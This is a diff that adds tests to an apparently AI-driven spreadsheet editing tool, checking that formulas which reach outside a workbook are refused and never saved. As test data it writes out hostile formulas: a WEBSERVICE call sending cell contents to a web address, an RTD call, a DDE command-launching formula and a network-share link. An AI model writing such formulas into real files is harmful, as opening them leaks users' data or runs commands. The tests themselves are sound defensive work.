@@ -206,3 +206,51 @@ def test_the_step_names_are_the_live_tools(book):
 def test_too_many_steps_and_a_wrong_shape_are_refused(book):
     assert "at most 60 feature steps" in _edit(book, [{"op": "freeze", "sheet": "Data", "cell": "B2"}] * 61).error
     assert "'features' is a list of steps" in _edit(book, ["freeze"]).error
+
+
+# ------------------------------------- a formula that would reach outside --
+
+OUTSIDE = '=WEBSERVICE("https://example.com/?d="&A1)'
+
+
+@pytest.mark.parametrize(
+    "args",
+    [
+        {"edits": [{"cell": "F1", "formula": OUTSIDE}]},
+        {"edits": [{"cell": "F1", "value": OUTSIDE}]},  # a text value starting with "=" IS a formula in the file
+        {"edits": [{"cell": "F1", "value": "fine"}],
+         "features": [{"op": "conditional_format", "range": "Data!A2:A12", "rule": "formula",
+                       "formula": '=LEN(WEBSERVICE("http://x"))>0', "fill": "C6EFCE"}]},
+        {"features": [{"op": "conditional_format", "range": "Data!B2:B12", "rule": "greater",
+                       "value": '=RTD("a",,"b")', "fill": "C6EFCE"}]},
+        {"edits": [{"cell": "F1", "formula": "=cmd|' /C calc'!A0"}]},
+        {"edits": [{"cell": "F1", "formula": r"='\\host\share\[b.xlsx]S'!A1"}]},  # a link to a network share
+    ],
+)
+def test_a_formula_that_would_send_cells_outside_is_never_written_to_a_saved_file(book, args):
+    """The open workbook's rule (the reviewer's, excel_worker.reaches_out) holds
+    for a saved file too: opened later, Excel itself would make the call."""
+    before = _sha(book)
+    res = asyncio.run(ExcelEditTool().execute({"path": book.name, "sheet": "Data", **args}, _ctx(book.parent)))
+    assert not res.ok and "is not written from chat" in res.error and res.error.endswith("Nothing was changed."), res.error
+    assert "The user can type it in Excel themselves" in res.error
+    assert _sha(book) == before
+
+
+def test_a_new_workbook_is_not_written_with_such_a_formula(tmp_path):
+    from iron_jarvis.documents.tools import document_tools
+
+    write = {t.name: t for t in document_tools()}["write_document"]
+    res = asyncio.run(write.execute({"path": "new.xlsx", "content": [["x", "y"], [1, OUTSIDE]]}, _ctx(tmp_path)))
+    assert not res.ok and "is not written from chat" in res.error
+    assert not (tmp_path / "new.xlsx").exists()
+
+
+def test_an_ordinary_formula_with_a_web_address_in_its_text_is_still_written(book):
+    res = asyncio.run(ExcelEditTool().execute(
+        {"path": book.name, "sheet": "Data",
+         "edits": [{"cell": "F1", "formula": '=HYPERLINK("https://example.com","site")'}, {"cell": "F2", "value": "=B2*2"}]},
+        _ctx(book.parent)))
+    assert res.ok, res.error
+    ws = load_workbook(book)["Data"]
+    assert ws["F1"].value == '=HYPERLINK("https://example.com","site")' and ws["F2"].value == "=B2*2"
